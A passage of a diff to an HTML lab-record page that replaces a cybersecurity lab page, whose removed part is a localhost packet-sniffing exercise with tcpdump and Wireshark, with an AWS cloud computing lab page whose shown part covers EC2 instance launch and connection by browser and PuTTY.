@@ -3,22 +3,26 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cybersecurity Lab Record</title>
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+<title>Cloud Computing Lab Record</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #0a0e17;
-    --surface: #111827;
-    --surface2: #1a2235;
-    --border: #1e2d45;
-    --accent: #00d4ff;
-    --accent2: #ff4d6d;
-    --accent3: #39ff98;
-    --text: #e2e8f0;
-    --text-muted: #64748b;
-    --text-dim: #94a3b8;
-    --mono: 'IBM Plex Mono', monospace;
-    --sans: 'Syne', sans-serif;
+    --bg: #09090f;
+    --surface: #0f1117;
+    --surface2: #161820;
+    --border: #1c1e2a;
+    --border2: #252838;
+    --a1: #ff6b35;
+    --a2: #ffd166;
+    --a3: #06d6a0;
+    --a4: #74b9ff;
+    --a5: #e17cff;
+    --a6: #ff4d8d;
+    --text: #dde1f0;
+    --muted: #555870;
+    --dim: #8a8fa8;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Outfit', sans-serif;
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -31,188 +35,336 @@
     overflow-x: hidden;
   }
 
-  /* Grid background */
-  body::before {
+  body::after {
     content: '';
     position: fixed;
     inset: 0;
-    background-image:
-      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
-    background-size: 40px 40px;
+    background:
+      radial-gradient(ellipse 60% 40% at 80% 10%, rgba(255,107,53,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse 50% 30% at 10% 80%, rgba(6,214,160,0.04) 0%, transparent 60%);
     pointer-events: none;
     z-index: 0;
   }
 
+  /* ── NAV ── */
+  nav {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(9,9,15,0.95);
+    backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 0;
+    padding: 0 24px;
+    height: 46px;
+    overflow-x: auto;
+    scrollbar-width: none;
+  }
+  nav::-webkit-scrollbar { display: none; }
+
+  .nav-brand {
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--a1);
+    white-space: nowrap;
+    margin-right: 20px;
+    flex-shrink: 0;
+  }
+
+  .nav-link {
+    text-decoration: none;
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 600;
+    color: var(--muted);
+    white-space: nowrap;
+    padding: 0 10px;
+    height: 46px;
+    display: flex;
+    align-items: center;
+    border-right: 1px solid var(--border);
+    transition: color 0.15s, background 0.15s;
+    flex-shrink: 0;
+  }
+  .nav-link:first-of-type { border-left: 1px solid var(--border); }
+  .nav-link:hover { color: var(--text); background: var(--surface); }
+
+  /* ── WRAPPER ── */
   .wrapper {
-    max-width: 900px;
+    max-width: 880px;
     margin: 0 auto;
-    padding: 60px 32px;
+    padding: 64px 28px 80px;
     position: relative;
     z-index: 1;
   }
 
-  /* Header */
+  /* ── HEADER ── */
   header {
-    text-align: center;
-    margin-bottom: 72px;
-    animation: fadeDown 0.8s ease both;
+    margin-bottom: 64px;
+    animation: fadeDown 0.7s ease both;
   }
 
-  .lab-badge {
+  .badge {
     display: inline-block;
     font-family: var(--mono);
-    font-size: 11px;
-    letter-spacing: 3px;
+    font-size: 10px;
+    letter-spacing: 4px;
     text-transform: uppercase;
-    color: var(--accent);
-    border: 1px solid var(--accent);
-    padding: 6px 16px;
-    margin-bottom: 24px;
-    position: relative;
+    color: var(--a1);
+    border: 1px solid rgba(255,107,53,0.35);
+    padding: 5px 14px;
+    margin-bottom: 22px;
   }
-
-  .lab-badge::before, .lab-badge::after {
-    content: '';
-    position: absolute;
-    width: 6px;
-    height: 6px;
-    background: var(--accent);
-  }
-  .lab-badge::before { top: -3px; left: -3px; }
-  .lab-badge::after { bottom: -3px; right: -3px; }
 
   h1 {
-    font-size: clamp(28px, 5vw, 48px);
+    font-size: clamp(30px, 5vw, 52px);
     font-weight: 800;
-    line-height: 1.1;
-    letter-spacing: -1px;
-    background: linear-gradient(135deg, #fff 0%, var(--accent) 100%);
+    line-height: 1.08;
+    letter-spacing: -1.5px;
+    background: linear-gradient(120deg, #fff 30%, var(--a1) 100%);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     background-clip: text;
-    margin-bottom: 12px;
+    margin-bottom: 10px;
   }
 
-  .header-sub {
+  .header-meta {
     font-family: var(--mono);
-    font-size: 13px;
-    color: var(--text-muted);
+    font-size: 12px;
+    color: var(--muted);
     letter-spacing: 1px;
   }
 
-  /* Experiment cards */
-  .experiment {
+  /* ── WEEK CARDS ── */
+  .week {
     background: var(--surface);
     border: 1px solid var(--border);
-    margin-bottom: 40px;
+    margin-bottom: 32px;
     position: relative;
-    animation: fadeUp 0.6s ease both;
     overflow: hidden;
+    animation: fadeUp 0.5s ease both;
   }
 
-  .experiment:nth-child(1) { animation-delay: 0.1s; }
-  .experiment:nth-child(2) { animation-delay: 0.2s; }
-  .experiment:nth-child(3) { animation-delay: 0.3s; }
-  .experiment:nth-child(4) { animation-delay: 0.4s; }
-
-  .experiment::before {
+  .week::before {
     content: '';
     position: absolute;
     top: 0; left: 0; right: 0;
     height: 2px;
   }
 
-  .experiment:nth-child(1)::before { background: var(--accent); }
-  .experiment:nth-child(2)::before { background: var(--accent2); }
-  .experiment:nth-child(3)::before { background: var(--accent3); }
-  .experiment:nth-child(4)::before { background: #a78bfa; }
+  .week:nth-child(1)::before  { background: var(--a1); }
+  .week:nth-child(2)::before  { background: var(--a2); }
+  .week:nth-child(3)::before  { background: var(--a3); }
+  .week:nth-child(4)::before  { background: var(--a4); }
+  .week:nth-child(5)::before  { background: var(--a5); }
+  .week:nth-child(6)::before  { background: var(--a6); }
+  .week:nth-child(7)::before  { background: var(--a1); }
+  .week:nth-child(8)::before  { background: var(--a2); }
+  .week:nth-child(9)::before  { background: var(--a3); }
+  .week:nth-child(10)::before { background: var(--a4); }
+  .week:nth-child(11)::before { background: var(--a5); }
+  .week:nth-child(12)::before { background: var(--a6); }
+  .week:nth-child(13)::before { background: var(--a1); }
 
-  .exp-header {
-    padding: 28px 32px;
+  .week-header {
+    padding: 24px 28px;
     border-bottom: 1px solid var(--border);
     display: flex;
     align-items: flex-start;
-    gap: 20px;
+    gap: 18px;
     cursor: pointer;
     user-select: none;
-    transition: background 0.2s;
+    transition: background 0.15s;
   }
-  .exp-header:hover { background: var(--surface2); }
+  .week-header:hover { background: var(--surface2); }
 
-  .exp-number {
-    font-family: var(--mono);
-    font-size: 11px;
-    letter-spacing: 2px;
-    color: var(--text-muted);
-    padding-top: 4px;
-    flex-shrink: 0;
-    min-width: 32px;
-  }
-
-  .exp-title-wrap { flex: 1; }
-
-  .exp-title {
-    font-size: 20px;
-    font-weight: 800;
-    letter-spacing: -0.3px;
-    line-height: 1.2;
-    margin-bottom: 6px;
-  }
-
-  .exp-subtitle {
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--text-muted);
-  }
-
-  .exp-toggle {
-    font-size: 20px;
-    color: var(--text-muted);
-    flex-shrink: 0;
-    transition: transform 0.3s;
-    line-height: 1;
-    padding-top: 4px;
-  }
-
-  .experiment.open .exp-toggle { transform: rotate(180deg); }
-
-  .exp-body {
-    display: none;
-    padding: 32px;
-  }
-
-  .experiment.open .exp-body { display: block; }
-
-  /* Section labels */
-  .section-label {
+  .week-num {
     font-family: var(--mono);
     font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--muted);
+    padding-top: 5px;
+    flex-shrink: 0;
+    min-width: 28px;
+  }
+
+  .week-title-wrap { flex: 1; }
+
+  .week-title {
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: -0.2px;
+    margin-bottom: 5px;
+    line-height: 1.25;
+  }
+
+  .week-sub {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .week-arrow {
+    color: var(--muted);
+    font-size: 18px;
+    flex-shrink: 0;
+    padding-top: 4px;
+    transition: transform 0.25s;
+  }
+  .week.open .week-arrow { transform: rotate(180deg); }
+
+  .week-body {
+    display: none;
+    padding: 28px;
+  }
+  .week.open .week-body { display: block; }
+
+  /* ── SECTION LABEL ── */
+  .label {
+    font-family: var(--mono);
+    font-size: 9px;
     letter-spacing: 3px;
     text-transform: uppercase;
-    color: var(--text-muted);
-    margin-bottom: 10px;
+    color: var(--muted);
     display: flex;
     align-items: center;
     gap: 10px;
+    margin-bottom: 12px;
   }
-  .section-label::after {
+  .label::after {
     content: '';
     flex: 1;
     height: 1px;
     background: var(--border);
   }
 
-  .section { margin-bottom: 28px; }
+  .section { margin-bottom: 26px; }
 
   p {
-    font-size: 15px;
+    font-size: 14.5px;
     line-height: 1.75;
-    color: var(--text-dim);
-    margin-bottom: 12px;
+    color: var(--dim);
+    margin-bottom: 10px;
   }
 
-  /* Tool pills */
+  /* ── STEPS ── */
+  .steps { list-style: none; }
+
+  .step {
+    display: flex;
+    gap: 14px;
+    padding: 11px 0;
+    border-bottom: 1px solid var(--border);
+    align-items: flex-start;
+  }
+  .step:last-child { border-bottom: none; }
+
+  .step-n {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--muted);
+    flex-shrink: 0;
+    min-width: 30px;
+    padding-top: 2px;
+  }
+
+  .step-text {
+    font-size: 14px;
+    color: var(--dim);
+    line-height: 1.65;
+  }
+
+  /* ── CODE ── */
+  code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: rgba(255,107,53,0.08);
+    color: #ff9a6c;
+    padding: 2px 7px;
+    border: 1px solid rgba(255,107,53,0.18);
+  }
+
+  .code-block {
+    background: #06060b;
+    border: 1px solid var(--border2);
+    padding: 18px 22px;
+    margin: 6px 0;
+    overflow-x: auto;
+    position: relative;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 10px;
+  }
+
+  .code-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .copy-btn {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 1px;
+    color: var(--muted);
+    background: transparent;
+    border: 1px solid var(--border2);
+    padding: 3px 10px;
+    cursor: pointer;
+    transition: all 0.15s;
+    text-transform: uppercase;
+  }
+  .copy-btn:hover { color: var(--text); border-color: var(--dim); }
+  .copy-btn.done { color: var(--a3); border-color: var(--a3); }
+
+  .code-block pre {
+    font-family: var(--mono);
+    font-size: 12.5px;
+    line-height: 1.85;
+    color: #9ba8c5;
+    white-space: pre;
+  }
+
+  .kw { color: #74b9ff; }
+  .cm { color: #404460; font-style: italic; }
+  .val { color: #fdcb6e; }
+  .str { color: #a8e6cf; }
+  .cmd { color: var(--a3); }
+
+  /* ── OUTPUT ── */
+  .output {
+    background: #06060b;
+    border: 1px solid var(--border2);
+    border-left: 3px solid var(--a3);
+    padding: 14px 18px;
+    margin: 6px 0;
+  }
+
+  .output-line {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--a3);
+    line-height: 1.9;
+  }
+
+  .output-line.note {
+    color: var(--muted);
+    font-size: 11px;
+    margin-top: 4px;
+  }
+
+  /* ── TOOLS ── */
   .tools {
     display: flex;
     flex-wrap: wrap;
@@ -220,1547 +372,1030 @@
     margin-bottom: 4px;
   }
 
-  .tool-pill {
+  .tool {
     font-family: var(--mono);
-    font-size: 12px;
-    padding: 5px 12px;
-    border: 1px solid var(--border);
-    color: var(--text-dim);
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid var(--border2);
     background: var(--surface2);
+    color: var(--dim);
     white-space: nowrap;
   }
 
-  /* Steps */
-  .steps { list-style: none; }
-
-  .step {
-    display: flex;
-    gap: 16px;
-    padding: 14px 0;
-    border-bottom: 1px solid var(--border);
-    align-items: flex-start;
-  }
-  .step:last-child { border-bottom: none; }
-
-  .step-num {
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--accent);
-    flex-shrink: 0;
-    width: 28px;
-    padding-top: 2px;
-  }
-
-  .experiment:nth-child(2) .step-num { color: var(--accent2); }
-  .experiment:nth-child(3) .step-num { color: var(--accent3); }
-  .experiment:nth-child(4) .step-num { color: #a78bfa; }
-
-  .step-text {
-    font-size: 14px;
-    color: var(--text-dim);
-    line-height: 1.65;
-  }
-
-  code {
-    font-family: var(--mono);
-    font-size: 12px;
-    background: rgba(0,212,255,0.07);
-    color: var(--accent);
-    padding: 2px 7px;
-    border: 1px solid rgba(0,212,255,0.15);
-  }
-
-  .experiment:nth-child(2) code { background: rgba(255,77,109,0.07); color: var(--accent2); border-color: rgba(255,77,109,0.15); }
-  .experiment:nth-child(3) code { background: rgba(57,255,152,0.07); color: var(--accent3); border-color: rgba(57,255,152,0.15); }
-  .experiment:nth-child(4) code { background: rgba(167,139,250,0.07); color: #a78bfa; border-color: rgba(167,139,250,0.15); }
-
-  /* Code block */
-  .code-block {
-    background: #080c14;
-    border: 1px solid var(--border);
-    padding: 20px 24px;
-    overflow-x: auto;
-    margin: 4px 0;
-  }
-
-  .code-block pre {
-    font-family: var(--mono);
-    font-size: 12.5px;
-    line-height: 1.8;
-    color: #a8c0e0;
-    white-space: pre;
-  }
-
-  .code-block .kw { color: #7dd3fc; }
-  .code-block .fn { color: #86efac; }
-  .code-block .str { color: #fda4af; }
-  .code-block .cm { color: #475569; font-style: italic; }
-  .code-block .num { color: #fdba74; }
-
-  /* Q&A */
-  .qa-item {
-    padding: 12px 0;
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    gap: 16px;
-    align-items: flex-start;
-  }
-  .qa-item:last-child { border-bottom: none; }
-  .qa-q {
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--text-muted);
-    flex-shrink: 0;
-    padding-top: 2px;
-  }
-  .qa-a { font-size: 14px; color: var(--text-dim); line-height: 1.6; }
-
-  /* Conclusion */
+  /* ── CONCLUSION ── */
   .conclusion {
     background: var(--surface2);
-    border: 1px solid var(--border);
-    padding: 18px 22px;
-    position: relative;
-    margin-top: 4px;
-  }
-
-  .conclusion-text {
-    font-size: 14px;
-    color: var(--text-dim);
-    line-height: 1.7;
-    margin: 0;
-  }
-
-  /* Sample output */
-  .output-block {
-    background: #080c14;
-    border: 1px solid var(--border);
+    border: 1px solid var(--border2);
     padding: 16px 20px;
-  }
-
-  .output-line {
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--accent3);
-    line-height: 1.9;
-  }
-
-  .output-line.label { color: var(--text-muted); margin-bottom: 6px; font-size: 11px; letter-spacing: 1px; }
-  .output-line.inp { color: var(--text-dim); }
-
-  /* Verdict */
-  .verdict {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    background: rgba(255,77,109,0.1);
-    border: 1px solid var(--accent2);
-    color: var(--accent2);
-    font-family: var(--mono);
-    font-size: 13px;
-    font-weight: 600;
-    padding: 8px 18px;
-    letter-spacing: 2px;
     margin-top: 4px;
   }
-  .verdict::before { content: '⚠'; }
 
-  /* Animations */
+  .conclusion p {
+    margin: 0;
+    font-size: 13.5px;
+    color: var(--dim);
+    line-height: 1.7;
+  }
+
+  /* ── SUB-HEADING ── */
+  .sub-heading {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--a4);
+    padding-bottom: 6px;
+    border-bottom: 1px dashed var(--border2);
+    margin: 18px 0 10px;
+  }
+
+  /* ── WEEK ACCENT COLORS ── */
+  .week:nth-child(1) .step-n, .week:nth-child(7) .step-n  { color: rgba(255,107,53,0.6); }
+  .week:nth-child(2) .step-n, .week:nth-child(8) .step-n  { color: rgba(255,209,102,0.6); }
+  .week:nth-child(3) .step-n, .week:nth-child(9) .step-n  { color: rgba(6,214,160,0.6); }
+  .week:nth-child(4) .step-n, .week:nth-child(10) .step-n { color: rgba(116,185,255,0.6); }
+  .week:nth-child(5) .step-n, .week:nth-child(11) .step-n { color: rgba(225,124,255,0.6); }
+  .week:nth-child(6) .step-n, .week:nth-child(12) .step-n { color: rgba(255,77,141,0.6); }
+  .week:nth-child(13) .step-n { color: rgba(255,107,53,0.6); }
+
+  /* ── ANIMATIONS ── */
   @keyframes fadeDown {
-    from { opacity: 0; transform: translateY(-20px); }
+    from { opacity: 0; transform: translateY(-16px); }
     to   { opacity: 1; transform: translateY(0); }
   }
   @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(20px); }
+    from { opacity: 0; transform: translateY(16px); }
     to   { opacity: 1; transform: translateY(0); }
   }
 
-  /* Responsive */
   @media (max-width: 600px) {
-    .wrapper { padding: 40px 16px; }
-    .exp-header { padding: 20px 20px; gap: 12px; }
-    .exp-body { padding: 20px; }
-    .code-block { padding: 14px 16px; }
+    .wrapper { padding: 40px 14px 60px; }
+    .week-header { padding: 18px 16px; }
+    .week-body { padding: 18px 14px; }
+    .code-block { padding: 14px 14px; }
   }
-
-  .top-nav {
-    position: sticky; top: 0; z-index: 200;
-    background: rgba(10,14,23,0.97);
-    backdrop-filter: blur(12px);
-    border-bottom: 1px solid var(--border);
-    display: flex; align-items: center;
-    padding: 0 20px; height: 48px;
-    overflow-x: auto; scrollbar-width: none;
-  }
-  .top-nav::-webkit-scrollbar { display: none; }
-  .nav-logo {
-    font-family: var(--mono); font-size: 11px; font-weight: 600;
-    color: var(--accent); letter-spacing: 2px; margin-right: 16px;
-    white-space: nowrap; text-transform: uppercase; flex-shrink: 0;
-  }
-  .nav-link {
-    text-decoration: none; padding: 5px 10px;
-    font-family: var(--mono); font-size: 10px; font-weight: 600;
-    white-space: nowrap; color: var(--text-muted);
-    transition: color 0.2s, background 0.2s; border-radius: 4px; flex-shrink: 0;
-  }
-  .nav-link:hover { color: var(--text); background: var(--surface2); }
-  .copy-btn {
-    background: transparent; border: 1px solid var(--border);
-    color: var(--text-muted); padding: 3px 10px; border-radius: 4px;
-    font-size: 10px; font-family: var(--mono); cursor: pointer;
-    transition: all 0.2s; font-weight: 600; letter-spacing: 0.5px;
-  }
-  .copy-btn:hover { border-color: rgba(255,255,255,0.2); color: var(--text); }
-  .copy-btn.copied { color: var(--accent3); border-color: var(--accent3); }
-  .cb-wrap { display:flex; align-items:center; justify-content:space-between; margin-bottom:6px; }
-  .cb-label { font-family:var(--mono); font-size:10px; color:var(--text-muted); letter-spacing:1px; }
-  .sub-heading {
-    font-family: var(--mono); font-size: 10px; font-weight: 600;
-    letter-spacing: 3px; text-transform: uppercase; color: var(--accent);
-    margin: 22px 0 10px; padding-bottom: 6px; border-bottom: 1px dashed var(--border);
-  }
-  .experiment:nth-child(5)::before { background: #f59e0b; }
-  .experiment:nth-child(6)::before { background: #e879f9; }
-  .experiment:nth-child(7)::before { background: #00c896; }
-  .experiment:nth-child(8)::before { background: #ff6b35; }
-  .experiment:nth-child(9)::before { background: #a78bfa; }
-  .experiment:nth-child(10)::before { background: #f59e0b; }
-  .experiment:nth-child(11)::before { background: #38bdf8; }
-  .experiment:nth-child(12)::before { background: #e879f9; }
-
-
-  .top-nav {
-    position: sticky; top: 0; z-index: 200;
-    background: rgba(10,14,23,0.97);
-    backdrop-filter: blur(12px);
-    border-bottom: 1px solid var(--border);
-    display: flex; align-items: center;
-    padding: 0 20px; height: 48px;
-    overflow-x: auto; scrollbar-width: none;
-  }
-  .top-nav::-webkit-scrollbar { display: none; }
-  .nav-logo {
-    font-family: var(--mono); font-size: 11px; font-weight: 600;
-    color: var(--accent); letter-spacing: 2px; margin-right: 16px;
-    white-space: nowrap; text-transform: uppercase; flex-shrink: 0;
-  }
-  .nav-link {
-    text-decoration: none; padding: 5px 10px;
-    font-family: var(--mono); font-size: 10px; font-weight: 600;
-    white-space: nowrap; color: var(--text-muted);
-    transition: color 0.2s, background 0.2s; border-radius: 4px; flex-shrink: 0;
-  }
-  .nav-link:hover { color: var(--text); background: var(--surface2); }
-  .copy-btn {
-    background: transparent; border: 1px solid var(--border);
-    color: var(--text-muted); padding: 3px 10px; border-radius: 4px;
-    font-size: 10px; font-family: var(--mono); cursor: pointer;
-    transition: all 0.2s; font-weight: 600; letter-spacing: 0.5px;
-  }
-  .copy-btn:hover { border-color: rgba(255,255,255,0.2); color: var(--text); }
-  .copy-btn.copied { color: var(--accent3); border-color: var(--accent3); }
-  .cb-wrap { display:flex; align-items:center; justify-content:space-between; margin-bottom:6px; }
-  .cb-label { font-family:var(--mono); font-size:10px; color:var(--text-muted); letter-spacing:1px; }
-
 </style>
 </head>
 <body>
 
-<nav class="top-nav">
-  <span class="nav-logo">&#128274; CS LAB</span>
-  <a href="#exp01" class="nav-link">01&#183;Sniff</a>
-  <a href="#exp02" class="nav-link">02&#183;Phish</a>
-  <a href="#exp03" class="nav-link">03&#183;Pwd</a>
-  <a href="#exp04" class="nav-link">04&#183;Firewall</a>
-  <a href="#exp05" class="nav-link">05&#183;XSS</a>
-  <a href="#exp06" class="nav-link">06&#183;SQLi</a>
-  <a href="#exp07" class="nav-link">07&#183;Auth</a>
-  <a href="#exp08" class="nav-link">08&#183;Mobile</a>
-  <a href="#exp09" class="nav-link">09&#183;IoT</a>
-  <a href="#exp10" class="nav-link">10&#183;Forensics</a>
-  <a href="#exp11" class="nav-link">11&#183;Logs</a>
-  <a href="#exp12" class="nav-link">12&#183;Wireshark</a>
-  <a href="#exp13" class="nav-link">13&#183;Privacy</a>
-</nav>
-
-<nav class="top-nav">
-  <span class="nav-logo">&#128274; CS LAB</span>
-  <a href="#exp01" class="nav-link">01&middot;Sniff</a>
-  <a href="#exp02" class="nav-link">02&middot;Phish</a>
-  <a href="#exp03" class="nav-link">03&middot;Pwd</a>
-  <a href="#exp04" class="nav-link">04&middot;FW</a>
-  <a href="#exp05" class="nav-link">05&middot;XSS</a>
-  <a href="#exp06" class="nav-link">06&middot;SQLi</a>
-  <a href="#exp07" class="nav-link">07&middot;Auth</a>
-  <a href="#exp08" class="nav-link">08&middot;Mobile</a>
-  <a href="#exp09" class="nav-link">09&middot;IoT</a>
-  <a href="#exp10" class="nav-link">10&middot;Forensics</a>
-  <a href="#exp11" class="nav-link">11&middot;Logs</a>
-  <a href="#exp12" class="nav-link">12&middot;Wireshark</a>
-  <a href="#exp13" class="nav-link">13&middot;Privacy</a>
+<nav>
+  <span class="nav-brand">AWS CC Lab</span>
+  <a href="#w1"  class="nav-link">W01</a>
+  <a href="#w2"  class="nav-link">W02</a>
+  <a href="#w3"  class="nav-link">W03</a>
+  <a href="#w4"  class="nav-link">W04</a>
+  <a href="#w5"  class="nav-link">W05</a>
+  <a href="#w6"  class="nav-link">W06</a>
+  <a href="#w7"  class="nav-link">W07</a>
+  <a href="#w8"  class="nav-link">W08</a>
+  <a href="#w9"  class="nav-link">W09</a>
+  <a href="#w10" class="nav-link">W10</a>
+  <a href="#w11" class="nav-link">W11</a>
+  <a href="#w12" class="nav-link">W12</a>
+  <a href="#w13" class="nav-link">W13</a>
 </nav>
 
 <div class="wrapper">
 
   <header>
-    <div class="lab-badge">Lab Record · Cybersecurity</div>
-    <h1>Network Security<br>Experiments</h1>
-    <p class="header-sub">Unit 1 — Practical Exercises</p>
+    <div class="badge">Lab Record &middot; Cloud Computing</div>
+    <h1>AWS Cloud<br>Experiments</h1>
+    <p class="header-meta">13 Weeks &mdash; Amazon Web Services Practicals</p>
   </header>
 
-  <!-- EXP 1 -->
-  <div class="experiment open" onclick="toggle(this)">
-    <div class="exp-header">
-      <div class="exp-number" id="exp01">01</div>
-      <div class="exp-title-wrap">
-        <div class="exp-title">Packet Sniffing & Network Traffic Analysis</div>
-        <div class="exp-subtitle">tcpdump · Wireshark · HTTP · Kali Linux</div>
+  <!-- WEEK 1 -->
+  <div class="week open" id="w1" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W01</div>
+      <div class="week-title-wrap">
+        <div class="week-title">EC2 Instance Creation and Connection</div>
+        <div class="week-sub">AWS EC2 &middot; Browser Connect &middot; PuTTY &middot; SSH</div>
       </div>
-      <div class="exp-toggle">▾</div>
+      <div class="week-arrow">&#9662;</div>
     </div>
-    <div class="exp-body">
+    <div class="week-body">
 
       <div class="section">
-        <div class="section-label">Objective</div>
-        <p>Capture live network packets, analyze them, and understand what information an attacker can observe. Since HTTP is unencrypted, all transmitted data is visible in plain text to anyone capturing the traffic.</p>
+        <div class="label">Objective</div>
+        <p>Launch an EC2 instance on AWS and connect to it using two methods: the browser-based EC2 Connect method and the PuTTY SSH client using a PPK key file.</p>
       </div>
 
       <div class="section">
-        <div class="section-label">Requirements</div>
-        <div class="tools">
-          <span class="tool-pill">Kali Linux (VirtualBox)</span>
-          <span class="tool-pill">Wireshark (built-in)</span>
-          <span class="tool-pill">Python HTTP Server</span>
-          <span class="tool-pill">tcpdump</span>
-          <span class="tool-pill">Firefox</span>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-label">Procedure</div>
+        <div class="label">Part A &mdash; Launch EC2 Instance</div>
         <ul class="steps">
-          <li class="step"><span class="step-num">01</span><span class="step-text">Open <strong>Kali Linux</strong> in Oracle VirtualBox and launch the terminal.</span></li>
-          <li class="step"><span class="step-num">02</span><span class="step-text">Open a terminal and start a local HTTP server on port 8080:<br><code>python3 -m http.server 8080</code></span></li>
-          <li class="step"><span class="step-num">03</span><span class="step-text">Open a <strong>second terminal</strong> and start packet capture, saving to a file:<br><code>sudo tcpdump -i any -w capture.pcap port 8080</code></span></li>
-          <li class="step"><span class="step-num">04</span><span class="step-text">Open <strong>Firefox</strong> and navigate to <code>http://localhost:8080</code>. Refresh the page several times to generate traffic.</span></li>
-          <li class="step"><span class="step-num">05</span><span class="step-text">Return to the tcpdump terminal and press <code>Ctrl + C</code> to stop capture. The packets are saved as <code>capture.pcap</code>.</span></li>
-          <li class="step"><span class="step-num">06</span><span class="step-text">Open <strong>File Manager</strong> → locate <code>capture.pcap</code> in the Home folder → double-click to open in Wireshark.</span></li>
-          <li class="step"><span class="step-num">07</span><span class="step-text">In Wireshark's filter bar, type <code>http.request.method == "POST"</code> and press Enter to isolate login packets.</span></li>
-          <li class="step"><span class="step-num">08</span><span class="step-text">Click on any packet to inspect its payload. Browser details, OS info, and any form-submitted credentials appear in plain text.</span></li>
+          <li class="step"><span class="step-n">01</span><span class="step-text">Open the <strong>Amazon EC2 Dashboard</strong> from the AWS Management Console.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Click <strong>Launch Instance</strong>. Provide an instance name, e.g., <code>Linux-ec2</code>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Select an <strong>AMI</strong> (Ubuntu). Note: AMI is region-specific and the AMI ID changes with the region.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Select the <strong>Instance Type</strong>. By default, <code>t3.micro</code> is selected as a free-tier eligible instance.</span></li>
+          <li class="step"><span class="step-n">05</span><span class="step-text">Under <strong>Key Pair</strong>, create a new RSA key pair. The <code>.pem</code> file downloads automatically.</span></li>
+          <li class="step"><span class="step-n">06</span><span class="step-text">Configure <strong>Network Settings</strong>: select VPC, subnet. For Linux, allow <strong>SSH (port 22)</strong> in the security group.</span></li>
+          <li class="step"><span class="step-n">07</span><span class="step-text">Click <strong>Launch Instance</strong>. AWS creates the EC2 with the specified configuration and region.</span></li>
         </ul>
       </div>
 
       <div class="section">
-        <div class="section-label">Conclusion</div>
+        <div class="label">Part B &mdash; Browser-Based Connection (EC2 Connect)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Select the running instance in the EC2 Console.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Click <strong>Connect</strong> at the top &rarr; choose <strong>EC2 Instance Connect</strong> tab &rarr; click <strong>Connect</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">A browser-based terminal opens. Connection is established without any client software.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Successfully connected to EC2 instance via browser-based method</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Part C &mdash; PuTTY Connection (PPK File)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Download and install <strong>PuTTY</strong> from the official site (<code>putty.org</code>).</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Create the EC2 instance with key pair format set to <strong>PPK</strong> during creation.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">If you have a <code>.pem</code> file, open <strong>PuTTYgen</strong> &rarr; <strong>Load</strong> the <code>.pem</code> file &rarr; click <strong>Save Private Key</strong> to generate the <code>.ppk</code> file.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Open <strong>PuTTY</strong>. Copy the instance's <strong>Public IP address</strong> and paste it in the <strong>Host Name</strong> field.</span></li>
+          <li class="step"><span class="step-n">05</span><span class="step-text">In the sidebar: <strong>Connection &rarr; SSH &rarr; Auth &rarr; Credentials</strong>. Browse and select the <code>.ppk</code> file.</span></li>
+          <li class="step"><span class="step-n">06</span><span class="step-text">Click <strong>Open</strong>. At the <em>login as:</em> prompt, type <code>ubuntu</code> (for Ubuntu AMI) and press Enter.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Successfully connected to EC2 instance via PuTTY</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
         <div class="conclusion">
